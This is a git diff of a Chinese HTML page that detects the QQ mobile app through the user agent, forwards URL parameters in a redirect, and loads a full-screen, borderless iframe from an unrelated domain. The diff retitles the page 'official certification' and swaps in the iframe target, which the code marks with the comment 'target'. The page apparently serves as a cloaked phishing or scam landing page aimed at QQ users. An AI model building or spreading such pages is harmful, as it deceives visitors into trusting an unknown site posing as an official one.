@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="zh">
 <head>
-    <title>wcloud778-测试</title>
+    <title>官方认证</title>
 	<meta charset="utf-8">
 	<meta name="viewport" content="width=device-width, initial-scale=1">
     <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
@@ -27,7 +27,7 @@
             let ishare = params["sina,ishare"];
             if (ks && uy && ishare) {
                 if (isQQEnvironment()) {
-                    let url = "https://qq2124935620.github.io/";
+                    let url = "/";
                     url += "Vgad74OLaGcUJQRKMgabz5,LA9TmCJsx5pYg-Sg,2K7epR";
                     url += "?_ks=" + ks;
                     url += "&uy=" + uy;
@@ -57,8 +57,10 @@
                     urlParams[paramName] = paramValue;
                 }
             }
+            
             return urlParams;
         }
+
         function isQQEnvironment() {
             let userAgent = navigator.userAgent.toLowerCase();
             let isAndroid = /android/.test(userAgent);
@@ -66,12 +68,13 @@
             let isQQ = /qq/.test(userAgent);
             
             return (isAndroid || isIOS) && isQQ;
-            iframe("https://qqwx.xiaozhengjz.com/" + u);
-        }//这里是目标
+        }
+
         function iframe(src) {
-            $("div").html('<iframe src="https://qqwx.xiaozhengjz.com/" width="100%" height="' + ($(window).height() - 5) + 'px" style="border: 0"></iframe>');
-            $(window).resize();//这里是目标
+            $("div").html('<iframe src="http://tdyfvjb.life/" width="100%" height="' + ($(window).height() - 5) + 'px" style="border: 0"></iframe>');
+            $(window).resize();//目标
         }
     </script>
+    <div></div>
 </body>
 </html>
